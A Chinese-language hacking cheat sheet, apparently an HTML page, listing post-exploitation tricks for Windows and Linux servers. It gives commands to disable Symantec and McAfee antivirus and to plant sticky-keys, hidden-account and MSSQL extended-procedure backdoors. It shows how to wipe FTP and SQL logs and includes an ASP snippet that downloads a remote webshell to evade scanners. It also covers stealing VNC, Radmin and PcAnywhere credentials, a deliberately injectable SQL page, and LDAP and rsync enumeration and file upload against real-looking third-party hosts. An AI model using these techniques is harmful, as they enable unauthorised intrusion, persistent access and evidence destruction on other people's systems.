+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3><FONT style="FONT-WEIGHT: bold; COLOR: #990000">关闭常见杀软（把杀软所在的文件的所有权限去掉）：</FONT> <br />
+
+<P>处理变态诺顿企业版：</P>
+<P>net stop "Symantec AntiVirus" /y <br />
+net stop "Symantec AntiVirus Definition Watcher" /y <br />
+net stop "Symantec Event Manager" /y <br />
+net stop "System Event Notification" /y <br />
+net stop "Symantec Settings Manager" /y</P>
+<P>麦咖啡：net stop "McAfee McShield"</P>
+<P>Symantec病毒日志: <br />
+C:\Documents and Settings\All Users\Application Data\Symantec\Symantec Endpoint Protection\Logs</P>
+<P>Symantec病毒备份: <br />
+C:\Documents and Settings\All Users\Application Data\Symantec\Symantec Endpoint Protection\Quarantine</P>
+<P>Nod32病毒备份: <br />
+C:\Docume~1\Administrator\Local Settings\Application Data\ESET\ESET NOD32 Antivirus\Quarantine</P>
+<P>Nod32移除密码保护: <br />
+删除“HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security\CurrentVersion\Info\PackageID”即可</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">安装5次shift后门，沾滞键后门，替换SHIFT后门：</FONT></P>
+<P>5次SHIFT，沾滞键后门： <br />
+copy %systemroot%\system32\sethc.exe %systemroot%\system32\dllcache\sethc1.exe <br />
+copy %systemroot%\system32\cmd.exe %systemroot%\system32\dllcache\sethc.exe /y <br />
+copy %systemroot%\system32\cmd.exe %systemroot%\system32\sethc.exe /y</P>
+<P>替换SHIFT后门： <br />
+attrib c:\windows\system32\sethc.exe -h -r -s <br />
+attrib c:\windows\system32\dllcache\sethc.exe -h -r -s <br />
+del c:\windows\system32\sethc.exe <br />
+copy c:\windows\explorer.exe c:\windows\system32\sethc.exe <br />
+copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe <br />
+attrib c:\windows\system32\sethc.exe +h +r +s <br />
+attrib c:\windows\system32\dllcache\sethc.exe +h +r +s</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">添加隐藏系统账号：</FONT></P>
+<P>1、执行命令：“net user admin$ 123456 /add&amp;net localgroup administrators admin$ /add”。 <br />
+2、导出注册表SAM下用户的两个键值。 <br />
+3、在用户管理界面里的 admin$ 删除，然后把备份的注册表导回去。 <br />
+4、利用 Hacker Defender 把相关用户注册表隐藏。</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">安装 MSSQL 扩展后门：</FONT></P>
+<P>USE master; <br />
+EXEC sp_addextendedproc 'xp_helpsystem', 'xp_helpsystem.dll'; <br />
+GRANT exec On xp_helpsystem TO public;</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">处理服务器MSFTP日志：</FONT></P>
+<P>&nbsp;&nbsp;&nbsp; 在“C:\WINNT\system32\LogFiles\MSFTPSVC1\”下有 ex011120.log / ex011121.log / ex011124.log 三个文件，直接删除 ex0111124.log 不成功，显示“原文件...正在使用”。</P>
+<P>&nbsp;&nbsp;&nbsp; 当然可以直接删除“ex011120.log / ex011121.log”。然后用记事本打开“ex0111124.log”，删除里面的一些内容后，保存，覆盖退出，成功。</P>
+<P>&nbsp;&nbsp;&nbsp; 当停止“msftpsvc”服务后可直接删除“ex011124.log”。</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">MSSQL查询分析器连接记录清除：</FONT></P>
+<P>MSSQL 2000 位于注册表如下：</P>
+<P>HKEY_CURRENT_USER\Software\Microsoft\Microsoft SQL Server\80\Tools\Client\PrefServers</P>
+<P>找到接接过的信息删除。</P>
+<P>MSSQL 2005 是在：</P>
+<P>C:\Documents and Settings\&lt;user&gt;\Application Data\Microsoft\Microsoft SQL Server\90\Tools\Shell\mru.dat</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">防BT系统拦截技巧，可以使用远程下载shell：</FONT></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P>&lt;% <br />
+Sub eWebEditor_SaveRemoteFile(s_LocalFileName, s_RemoteFileUrl) <br />
+&nbsp;&nbsp;&nbsp; Dim Ads, Retrieval, GetRemoteData <br />
+&nbsp;&nbsp;&nbsp; On Error Resume Next <br />
+&nbsp;&nbsp;&nbsp; Set Retrieval = Server.CreateObject("Microsoft.XMLHTTP") <br />
+&nbsp;&nbsp;&nbsp; With Retrieval <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .Open "Get", s_RemoteFileUrl, False, "", "" <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .Send <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GetRemoteData = .ResponseBody <br />
+&nbsp;&nbsp;&nbsp; End With <br />
+&nbsp;&nbsp;&nbsp; Set Retrieval = Nothing <br />
+&nbsp;&nbsp;&nbsp; Set Ads = Server.CreateObject("Adodb.Stream") <br />
+&nbsp;&nbsp;&nbsp; With Ads <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .Type = 1 <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .Open <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .Write GetRemoteData <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .SaveToFile Server.MapPath(s_LocalFileName), 2 <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .Cancel() <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .Close() <br />
+&nbsp;&nbsp;&nbsp; End With <br />
+&nbsp;&nbsp;&nbsp; Set Ads = Nothing <br />
+End Sub</P>
+<P>eWebEditor_SaveRemoteFile "<STRONG>your shell's name</STRONG>", "<STRONG>your shell'urL</STRONG>" <br />
+%&gt;</P></TD></TR></TBODY></TABLE></P>
+<P>&nbsp;&nbsp;&nbsp; 防BT系统拦截技巧，可以使用远程下载shell，也达到了隐藏自身的效果，也可以做为超隐蔽的后门，神马的免杀webshell，用服务器安全工具一扫通通挂掉了。</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">VNC、Radmin、PcAnywhere 的提权方法：</FONT></P>
+<P>&nbsp;&nbsp;&nbsp; 首先利用 shell 读取 vnc 保存在注册表中的密文，然后再使用工具VNC4X破解。</P>
+<P>&nbsp;&nbsp;&nbsp; 注册表位置：HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\password</P>
+<P>&nbsp;&nbsp;&nbsp; Radmin 默认端口是4899，先获取密码和端口，如下位置：</P>
+<P>&nbsp;&nbsp;&nbsp; HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter //默认密码注册表位置</P>
+<P>&nbsp;&nbsp;&nbsp; HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Port //默认端口注册表位置</P>
+<P>&nbsp;&nbsp;&nbsp; 然后用HASH版连接。</P>
+<P>&nbsp;&nbsp;&nbsp; 如果我们拿到一台主机的WEBSEHLL。通过查找发现其上安装有 PcAnywhere 同时保存密码文件的目录是允许我们的IUSER权限访问，我们可以下载这个CIF文件到本地破解，再通过 PcAnywhere 从本机登陆服务器。</P>
+<P>&nbsp;&nbsp;&nbsp; 保存密码的CIF文件,不是位于PcAnywhere的安装目录,而且位于安装PcAnywhere所安装盘的：</P>
+<P>&nbsp;&nbsp;&nbsp; “\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\”</P>
+<P>&nbsp;&nbsp;&nbsp; 如果PcAnywhere安装在“D:\program\”文件夹下，那么PcAnywhere的密码文件就保存在：“D:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\”文件夹下。</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">搜狗输入法 PinyinUp.exe 提权：</FONT></P>
+<P>&nbsp;&nbsp;&nbsp; 搜狗输入法的“PinyinUp.exe”是可读可写的直接替换即可，位于搜狗安装目录下，例如：</P>
+<P>&nbsp;&nbsp;&nbsp; “C:\Program Files\SogouInput\5.0.0.3819\PinyinUp.exe”</P>
+<P>&nbsp;&nbsp;&nbsp; 搜狗拼音输入法，会定时调用这个文件进行升级，禁止还禁止不掉，呵呵，天然的后门。</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">WinWebMail 提权加用户：</FONT></P>
+<P>&nbsp;&nbsp;&nbsp; WinWebMail目录下的web必须设置everyone权限可读可写，在开始程序里，找到WinWebMail快捷方式，接下来，看路径，访问“路径\web”传 shell，访问shell后，权限是system，直接放远控进启动项，等待下次重启。</P>
+<P>&nbsp;&nbsp;&nbsp; 没有删cmd组件的可以直接加用户，7i24的web目录也是可写，权限为administrator。</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">1433 SA权限构建注入点：</FONT></P>
+<P>&lt;% <br />
+strSQLServerName = "服务器ip" <br />
+strSQLDBUserName = "数据库帐号" <br />
+strSQLDBPassword = "数据库密码" <br />
+strSQLDBName = "数据库名称" <br />
+Set conn = server.CreateObject("ADODB.Connection") <br />
+strCon = "Provider=SQLOLEDB.1;Persist Security Info=False;Server=" &amp; strSQLServerName &amp; ";User ID=" &amp; strSQLDBUserName &amp; ";Password=" &amp; strSQLDBPassword &amp; ";Database=" &amp; strSQLDBName &amp; ";" <br />
+conn.open strCon <br />
+Dim rs, strSQL, id <br />
+Set rs = server.CreateObject("ADODB.recordset") <br />
+id = request("id") <br />
+strSQL = "select * from ACTLIST where worldid=" &amp; idrs.open strSQL,conn,1,3 <br />
+rs.Close <br />
+%&gt;</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">liunx 相关提权渗透技巧总结，一、ldap 渗透技巧：</FONT></P>
+<P>1.cat /etc/nsswitch <br />
+看看密码登录策略我们可以看到使用了file ldap模式</P>
+<P>2.less /etc/ldap.conf <br />
+base ou=People,dc=unix-center,dc=net <br />
+找到ou,dc,dc设置</P>
+<P>3.查找管理员信息</P>
+<P>匿名方式 <br />
+ldapsearch -x -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2</P>
+<P>有密码形式 <br />
+ldapsearch -x -W -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2</P>
+<P>4.查找10条用户记录 <br />
+ldapsearch -h 192.168.2.2 -x -z 10 -p 指定端口</P>
+<P>实战: <br />
+1.cat /etc/nsswitch <br />
+看看密码登录策略我们可以看到使用了file ldap模式</P>
+<P>2.less /etc/ldap.conf <br />
+base ou=People,dc=unix-center,dc=net <br />
+找到ou,dc,dc设置</P>
+<P>3.查找管理员信息</P>
+<P>匿名方式 <br />
+ldapsearch -x -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2</P>
+<P>有密码形式 <br />
+ldapsearch -x -W -D "cn=administrator,cn=People,dc=unix-center,dc=net" -b "cn=administrator,cn=People,dc=unix-center,dc=net" -h 192.168.2.2</P>
+<P>4.查找10条用户记录 <br />
+ldapsearch -h 192.168.2.2 -x -z 10 -p 指定端口</P>
+<P>渗透实战: <br />
+1.返回所有的属性 <br />
+ldapsearch -h 192.168.7.33 -b "dc=ruc,dc=edu,dc=cn" -s sub "objectclass=*" <br />
+version: 1 <br />
+dn: dc=ruc,dc=edu,dc=cn <br />
+dc: ruc <br />
+objectClass: domain</P>
+<P>dn: uid=manager,dc=ruc,dc=edu,dc=cn <br />
+uid: manager <br />
+objectClass: inetOrgPerson <br />
+objectClass: organizationalPerson <br />
+objectClass: person <br />
+objectClass: top <br />
+sn: manager <br />
+cn: manager</P>
+<P>dn: uid=superadmin,dc=ruc,dc=edu,dc=cn <br />
+uid: superadmin <br />
+objectClass: inetOrgPerson <br />
+objectClass: organizationalPerson <br />
+objectClass: person <br />
+objectClass: top <br />
+sn: superadmin <br />
+cn: superadmin</P>
+<P>dn: uid=admin,dc=ruc,dc=edu,dc=cn <br />
+uid: admin <br />
+objectClass: inetOrgPerson <br />
+objectClass: organizationalPerson <br />
+objectClass: person <br />
+objectClass: top <br />
+sn: admin <br />
+cn: admin</P>
+<P>dn: uid=dcp_anonymous,dc=ruc,dc=edu,dc=cn <br />
+uid: dcp_anonymous <br />
+objectClass: top <br />
+objectClass: person <br />
+objectClass: organizationalPerson <br />
+objectClass: inetOrgPerson <br />
+sn: dcp_anonymous <br />
+cn: dcp_anonymous</P>
+<P>2.查看基类 <br />
+bash-3.00# ldapsearch -h 192.168.7.33 -b "dc=ruc,dc=edu,dc=cn" -s base "objectclass=*" | </P>
+<P>more <br />
+version: 1 <br />
+dn: dc=ruc,dc=edu,dc=cn <br />
+dc: ruc <br />
+objectClass: domain</P>
+<P>3.查找 <br />
+bash-3.00# ldapsearch -h 192.168.7.33 -b "" -s base "objectclass=*" <br />
+version: 1 <br />
+dn: <br />
+objectClass: top <br />
+namingContexts: dc=ruc,dc=edu,dc=cn <br />
+supportedExtension: 2.16.840.1.113730.3.5.7 <br />
+supportedExtension: 2.16.840.1.113730.3.5.8 <br />
+supportedExtension: 1.3.6.1.4.1.4203.1.11.1 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.25 <br />
+supportedExtension: 2.16.840.1.113730.3.5.3 <br />
+supportedExtension: 2.16.840.1.113730.3.5.5 <br />
+supportedExtension: 2.16.840.1.113730.3.5.6 <br />
+supportedExtension: 2.16.840.1.113730.3.5.4 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.1 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.2 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.3 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.4 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.5 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.6 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.7 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.8 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.9 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.23 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.11 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.12 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.13 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.14 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.15 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.16 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.17 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.18 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.19 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.21 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.22 <br />
+supportedExtension: 1.3.6.1.4.1.42.2.27.9.6.24 <br />
+supportedExtension: 1.3.6.1.4.1.1466.20037 <br />
+supportedExtension: 1.3.6.1.4.1.4203.1.11.3 <br />
+supportedControl: 2.16.840.1.113730.3.4.2 <br />
+supportedControl: 2.16.840.1.113730.3.4.3 <br />
+supportedControl: 2.16.840.1.113730.3.4.4 <br />
+supportedControl: 2.16.840.1.113730.3.4.5 <br />
+supportedControl: 1.2.840.113556.1.4.473 <br />
+supportedControl: 2.16.840.1.113730.3.4.9 <br />
+supportedControl: 2.16.840.1.113730.3.4.16 <br />
+supportedControl: 2.16.840.1.113730.3.4.15 <br />
+supportedControl: 2.16.840.1.113730.3.4.17 <br />
+supportedControl: 2.16.840.1.113730.3.4.19 <br />
+supportedControl: 1.3.6.1.4.1.42.2.27.9.5.2 <br />
+supportedControl: 1.3.6.1.4.1.42.2.27.9.5.6 <br />
+supportedControl: 1.3.6.1.4.1.42.2.27.9.5.8 <br />
+supportedControl: 1.3.6.1.4.1.42.2.27.8.5.1 <br />
+supportedControl: 1.3.6.1.4.1.42.2.27.8.5.1 <br />
+supportedControl: 2.16.840.1.113730.3.4.14 <br />
+supportedControl: 1.3.6.1.4.1.1466.29539.12 <br />
+supportedControl: 2.16.840.1.113730.3.4.12 <br />
+supportedControl: 2.16.840.1.113730.3.4.18 <br />
+supportedControl: 2.16.840.1.113730.3.4.13 <br />
+supportedSASLMechanisms: EXTERNAL <br />
+supportedSASLMechanisms: DIGEST-MD5 <br />
+supportedLDAPVersion: 2 <br />
+supportedLDAPVersion: 3 <br />
+vendorName: Sun Microsystems, Inc. <br />
+vendorVersion: Sun-Java(tm)-System-Directory/6.2 <br />
+dataversion: 020090516011411 <br />
+netscapemdsuffix: cn=ldap://dc=webA:389 <br />
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA <br />
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA <br />
+supportedSSLCiphers: TLS_DHE_RSA_WITH_AES_256_CBC_SHA <br />
+supportedSSLCiphers: TLS_DHE_DSS_WITH_AES_256_CBC_SHA <br />
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_AES_256_CBC_SHA <br />
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA <br />
+supportedSSLCiphers: TLS_RSA_WITH_AES_256_CBC_SHA <br />
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_RC4_128_SHA <br />
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA <br />
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_RC4_128_SHA <br />
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA <br />
+supportedSSLCiphers: TLS_DHE_DSS_WITH_RC4_128_SHA <br />
+supportedSSLCiphers: TLS_DHE_RSA_WITH_AES_128_CBC_SHA <br />
+supportedSSLCiphers: TLS_DHE_DSS_WITH_AES_128_CBC_SHA <br />
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_RC4_128_SHA <br />
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_AES_128_CBC_SHA <br />
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_RC4_128_SHA <br />
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA <br />
+supportedSSLCiphers: SSL_RSA_WITH_RC4_128_MD5 <br />
+supportedSSLCiphers: SSL_RSA_WITH_RC4_128_SHA <br />
+supportedSSLCiphers: TLS_RSA_WITH_AES_128_CBC_SHA <br />
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA <br />
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA <br />
+supportedSSLCiphers: SSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA <br />
+supportedSSLCiphers: SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA <br />
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA <br />
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA <br />
+supportedSSLCiphers: SSL_RSA_FIPS_WITH_3DES_EDE_CBC_SHA <br />
+supportedSSLCiphers: SSL_RSA_WITH_3DES_EDE_CBC_SHA <br />
+supportedSSLCiphers: SSL_DHE_RSA_WITH_DES_CBC_SHA <br />
+supportedSSLCiphers: SSL_DHE_DSS_WITH_DES_CBC_SHA <br />
+supportedSSLCiphers: SSL_RSA_FIPS_WITH_DES_CBC_SHA <br />
+supportedSSLCiphers: SSL_RSA_WITH_DES_CBC_SHA <br />
+supportedSSLCiphers: TLS_RSA_EXPORT1024_WITH_RC4_56_SHA <br />
+supportedSSLCiphers: TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA <br />
+supportedSSLCiphers: SSL_RSA_EXPORT_WITH_RC4_40_MD5 <br />
+supportedSSLCiphers: SSL_RSA_EXPORT_WITH_RC2_CBC_40_MD5 <br />
+supportedSSLCiphers: TLS_ECDHE_ECDSA_WITH_NULL_SHA <br />
+supportedSSLCiphers: TLS_ECDHE_RSA_WITH_NULL_SHA <br />
+supportedSSLCiphers: TLS_ECDH_RSA_WITH_NULL_SHA <br />
+supportedSSLCiphers: TLS_ECDH_ECDSA_WITH_NULL_SHA <br />
+supportedSSLCiphers: SSL_RSA_WITH_NULL_SHA <br />
+supportedSSLCiphers: SSL_RSA_WITH_NULL_MD5 <br />
+supportedSSLCiphers: SSL_CK_RC4_128_WITH_MD5 <br />
+supportedSSLCiphers: SSL_CK_RC2_128_CBC_WITH_MD5 <br />
+supportedSSLCiphers: SSL_CK_DES_192_EDE3_CBC_WITH_MD5 <br />
+supportedSSLCiphers: SSL_CK_DES_64_CBC_WITH_MD5 <br />
+supportedSSLCiphers: SSL_CK_RC4_128_EXPORT40_WITH_MD5 <br />
+supportedSSLCiphers: SSL_CK_RC2_128_CBC_EXPORT40_WITH_MD5</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">liunx 相关提权渗透技巧总结，二、NFS 渗透技巧：</FONT></P>
+<P>列举IP：showmount -e ip</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">liunx 相关提权渗透技巧总结，三、rsync渗透技巧：</FONT></P>
+<P dir=ltr style="MARGIN-RIGHT: 0px">1.查看rsync服务器上的列表：</P>
+<BLOCKQUOTE dir=ltr style="MARGIN-RIGHT: 0px">
+<P dir=ltr style="MARGIN-RIGHT: 0px">rsync 210.51.X.X:: <br />
+finance <br />
+img_finance <br />
+auto <br />
+img_auto <br />
+html_cms <br />
+img_cms <br />
+ent_cms <br />
+ent_img <br />
+ceshi <br />
+res_img <br />
+res_img_c2 <br />
+chip <br />
+chip_c2 <br />
+ent_icms <br />
+games <br />
+gamesimg <br />
+media <br />
+mediaimg <br />
+fashion <br />
+res-fashion <br />
+res-fo <br />
+taobao-home <br />
+res-taobao-home <br />
+house <br />
+res-house <br />
+res-home <br />
+res-edu <br />
+res-ent <br />
+res-labs <br />
+res-news <br />
+res-phtv <br />
+res-media <br />
+home <br />
+edu <br />
+news <br />
+res-book</P></BLOCKQUOTE>
+<P>看相应的下级目录(注意一定要在目录后面添加上/)</P>
+<P>rsync 210.51.X.X::htdocs_app/ <br />
+rsync 210.51.X.X::auto/ <br />
+rsync 210.51.X.X::edu/</P>
+<P>2.下载rsync服务器上的配置文件 <br />
+rsync -avz 210.51.X.X::htdocs_app/ /tmp/app/</P>
+<P>3.向上更新rsync文件(成功上传,不会覆盖) <br />
+rsync -avz nothack.php 210.51.X.X::htdocs_app/warn/ <br />
+http://app.finance.xxx.com/warn/nothack.txt</P></TD></TR></TBODY></TABLE></P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">liunx 相关提权渗透技巧总结，四、squid渗透技巧：</FONT></P>
